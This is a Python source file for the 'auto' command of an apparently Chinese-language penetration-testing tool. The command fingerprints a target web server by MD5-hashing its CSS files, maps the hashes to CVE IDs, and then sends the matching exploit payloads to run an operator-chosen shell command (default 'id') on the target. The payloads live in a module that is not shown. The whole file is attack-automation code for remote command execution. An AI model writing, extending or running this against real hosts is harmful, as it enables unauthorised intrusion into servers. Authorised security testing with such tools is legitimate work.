# -*- coding: utf-8 -*-
"""Auto command - 自动化渗透测试"""

import os
import sys
import argparse
from . import BaseCommand


class AutoCommand(BaseCommand):
    """自动化渗透测试命令（指纹识别 + 自动执行Payload）"""

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        """添加auto命令的参数"""
        parser.add_argument('url', help='目标URL（如: http://192.168.1.1:80/）')
        parser.add_argument('--cmd', default='id', help='要执行的命令（默认: id）')
        parser.add_argument('--timeout', type=float, default=3.0, help='超时时间（秒，默认3.0）')

    def execute(self, args: argparse.Namespace) -> int:
        """执行auto命令"""
        try:
            # 导入必要的模块
            sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
            from fingerprint import get_css_files_md5_from_page
            from payload_sender import PayloadManager

            url = args.url
            cmd = args.cmd
            timeout = args.timeout

            print(f"\n{'='*60}", flush=True)
            print("自动化渗透测试", flush=True)
            print(f"{'='*60}", flush=True)
            print(f"目标 URL: {url}", flush=True)
            print(f"执行命令: {cmd}", flush=True)
            print(f"{'='*60}\n", flush=True)

            # 步骤1: 指纹识别
            print("[*] 步骤1: 正在进行指纹识别...", flush=True)
            css_md5_dict = get_css_files_md5_from_page(url, timeout)

            if not css_md5_dict:
                print("[!] 未找到CSS文件或指纹识别失败", flush=True)
                return 1

            # 收集匹配的CVE
            matched_cves = set()
            for css_url, info in css_md5_dict.items():
                if isinstance(info, tuple):
                    md5_hash, cve_id = info
                    if cve_id:
                        matched_cves.add(cve_id)

            if not matched_cves:
                print("[!] 未匹配到任何CVE", flush=True)
                return 1

            print(f"[+] 匹配到 {len(matched_cves)} 个CVE: {', '.join(matched_cves)}", flush=True)

            # 步骤2: 自动执行Payload
            print(f"\n[*] 步骤2: 正在自动执行Payload...", flush=True)
            manager = PayloadManager(debug=False)

            # 从URL提取IP:端口
            from urllib.parse import urlparse
            parsed = urlparse(url)
            host = parsed.hostname or ''
            port = parsed.port or (443 if parsed.scheme == 'https' else 80)
            ip_port = f"{host}:{port}"

            success_count = 0
            for cve_id in matched_cves:
                print(f"\n[*] 尝试执行 {cve_id}...", flush=True)
                result = manager.send_payload_safe(cve_id, ip_port, cmd, timeout=10)
                if result:
                    success_count += 1

            print(f"\n{'='*60}", flush=True)
            print(f"自动化测试完成: 成功 {success_count}/{len(matched_cves)}", flush=True)
            print(f"{'='*60}\n", flush=True)

            return 0 if success_count > 0 else 1

        except Exception as e:
            print(f"[!] 错误: {e}", file=sys.stderr, flush=True)
            return 1
